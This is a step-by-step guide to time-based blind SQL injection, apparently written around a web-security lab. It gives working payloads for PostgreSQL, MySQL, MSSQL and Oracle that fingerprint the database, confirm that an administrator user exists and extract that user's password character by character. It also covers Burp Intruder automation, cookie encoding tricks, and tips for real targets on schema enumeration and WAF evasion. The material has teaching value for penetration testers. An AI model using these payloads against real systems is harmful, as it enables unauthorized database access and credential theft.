# Blind SQL Injection — Time-Based | Full Guide

---

## What It Is

The app gives you nothing back — no errors, no data, no visible behavior change. But the backend is still running your SQL. You prove it by making the database **wait**. If you inject `pg_sleep(10)` and the response takes 10 seconds, your SQL executed. That delay is your signal.

Think of it as 20 questions:
- Delay (~10s) = **YES**
- Instant (~200ms) = **NO**

Using this, you extract anything — one character at a time.

---

## Step 1: Find the Injection Vector

Every place the app sends your input to the server is a potential vector:
- URL parameters (`?id=1`, `?category=Gifts`)
- Cookies (tracking/analytics cookies like `TrackingId`)
- HTTP headers (`User-Agent`, `X-Forwarded-For`, `Referer`)
- POST body (JSON, XML, form fields)
- Hidden form fields

What to look for: parameters that filter, sort, search, or track — those touch the database.

> **Pro tip:** Tracking cookies are a classic SQLi vector — developers often forget to sanitize them because they're "just analytics".

---

## Step 2: Probe for Injection

Send a single `'` in each vector. Watch for:
- 500 error
- Changed response size
- Different page content
- Any weird behavior

Nothing visible? Doesn't mean it's safe — move to time-based testing.

---

## Step 3: Fingerprint the Database

Try each DB type one at a time. The one that causes ~10 second delay = your DB engine.

| DB         | Payload |
|------------|---------|
| PostgreSQL | `'%3b SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--` |
| MySQL      | `'%3b SELECT IF(1=1,SLEEP(10),'a')--` |
| MSSQL      | `'; IF (1=1) WAITFOR DELAY '0:0:10'--` |
| Oracle     | `'\|\|(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual)--` |

Why conditional syntax and not just `pg_sleep(10)` directly? A bare sleep can't always be appended cleanly to an existing query. Wrapping it in `CASE WHEN` makes it a valid SQL expression that evaluates in context.

---

## Step 4: Verify True vs False

Once you identify the DB, confirm your signal is reliable:

```
# True (should delay ~10s):
'%3b SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--

# False (should respond instantly):
'%3b SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

If both behave as expected, your signal is clean and confirmed.

---

## The Cookie Semicolon Problem

This will break your payload silently and you won't know why.

In HTTP, `;` separates cookies:
```
Cookie: TrackingId=abc123; session=xyz789
```

If you inject `'; pg_sleep(10)--` into a cookie, the server parses it as:
```
TrackingId = abc123'
[new cookie] = pg_sleep(10)--
```

Your payload never reaches SQL.

**Fix:** URL-encode `;` as `%3B` and `=` as `%3D` inside cookie values.

---

## Step 5: Confirm Target User Exists

```
'%3b SELECT CASE WHEN (username%3d'administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Delay = user exists. Instant = doesn't exist (or wrong table/column name).

> **IRL:** You won't know table/column names. Query `information_schema.tables` and `information_schema.columns` first using the same time-based technique.

---

## Step 6: Determine Password Length

```
'%3b SELECT CASE WHEN (LENGTH(password)>10) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username%3d'administrator'--
```

Binary search: `>10`, `>20`, `>15`, etc.

> **MSSQL:** Use `LEN()` instead of `LENGTH()`.

---

## Step 7: Extract Data Character by Character

```
'%3b SELECT CASE WHEN (SUBSTRING(password,1,1)%3d'a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username%3d'administrator'--
```

Change position (`1`) and character (`a`) each time.

Manually: 20 chars × 36 possibilities = 720 requests minimum. Automate it.

---

## Step 8: Automate with Burp Intruder (Cluster Bomb)

Cluster bomb = two payload sets, tries every combination.

**Payload template:**
```
'%3b SELECT CASE WHEN (SUBSTRING(password,§1§,1)%3d'§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username%3d'administrator'--
```

- **Payload 1:** Numbers 1–[password length] (positions)
- **Payload 2:** a-z, 0-9 (characters)

---

## Step 9: Resource Pool — CRITICAL

Before running → Resource pool tab → create new pool:
- **Max concurrent requests: 1**

Why: If Burp sends 10 requests simultaneously, multiple DB sleeps overlap and you can't tell which character caused which delay. Results become noise.

**This applies to ALL time-based attacks, always.**

---

## Step 10: Reading Results

- Enable **Response received** column (right-click column headers)
- Sort highest → lowest
- Hits = **~10000ms**
- Misses = **~150–300ms**
- Each hit: Payload 1 = position, Payload 2 = character
- Sort hits by Payload 1 ascending → read Payload 2 in order → password

---

## DB-Specific Extraction Chains

### PostgreSQL
```
# Confirm user exists
'%3b SELECT CASE WHEN (username%3d'administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

# Extract password char by char
'%3b SELECT CASE WHEN (SUBSTRING(password,1,1)%3d'a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username%3d'administrator'--
```

### MySQL
```
# Confirm user exists
'%3b SELECT IF((SELECT COUNT(*) FROM users WHERE username%3d'administrator')%3d1,SLEEP(10),0)--

# Extract password char by char
'%3b SELECT IF(SUBSTRING(password,1,1)%3d'a',SLEEP(10),0) FROM users WHERE username%3d'administrator'--
```

### MSSQL
```
# Confirm user exists
'; IF (SELECT COUNT(*) FROM users WHERE username='administrator')=1 WAITFOR DELAY '0:0:10'--

# Extract password char by char
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' WAITFOR DELAY '0:0:10'--
```

### Oracle
```
# Confirm user exists
'||(SELECT CASE WHEN (username='administrator') THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM users WHERE rownum=1)||'

# Extract password char by char
'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM users WHERE username='administrator')||'
```

---

## Common Issues & Fixes

| Problem | Fix |
|---------|-----|
| `;` in cookie cuts payload | Encode as `%3B` |
| `=` breaks cookie/URL param | Encode as `%3D` |
| `'` breaks early | Encode as `%27` |
| Space breaks payload | Use `+` or `%20` |
| No delay at all | Check Burp Raw tab — confirm full payload is being sent |
| Still nothing | Try each DB type — you might have the wrong one |
| Inconsistent delays | Network latency. Increase sleep to 15s or use a more stable connection |
| Double `'` before `%3b` | Always check Burp Raw tab before running |
| Extracting wrong user's password | Missing `WHERE username='administrator'` |
| Results are noisy | Resource pool must be set to max 1 concurrent request |

---

## Real-World Tips

**Speed up:**
- Use `pg_sleep(3)` — 3s is still clearly different from 200ms, and 3× faster per request
- Narrow charset: lowercase + digits = 36 chars instead of 62+
- Know the password length first to avoid wasted requests
- Use ASCII binary search (`>64`, `>96`, etc.) instead of character-by-character comparison — cuts requests from ~36 to ~7 per position

**In real targets:**
- You won't know table/column names — enumerate `information_schema.tables` and `information_schema.columns` first using the same time-based technique
- WAFs may detect `SLEEP`/`WAITFOR`/`pg_sleep` — try alternative delays (heavy queries, `BENCHMARK()` in MySQL)
- Some apps use connection pooling — your sleep might affect a different connection than your response. Test reliability before committing to a long extraction

---

## URL Encoding Reference

| Char  | Encoded |
|-------|---------|
| `;`   | `%3B`   |
| `=`   | `%3D`   |
| `'`   | `%27`   |
| space | `+` or `%20` |
| `"`   | `%22`   |
| `(`   | `%28`   |
| `)`   | `%29`   |

---

The mindset: no output → use time → ask true/false → extract bit by bit.
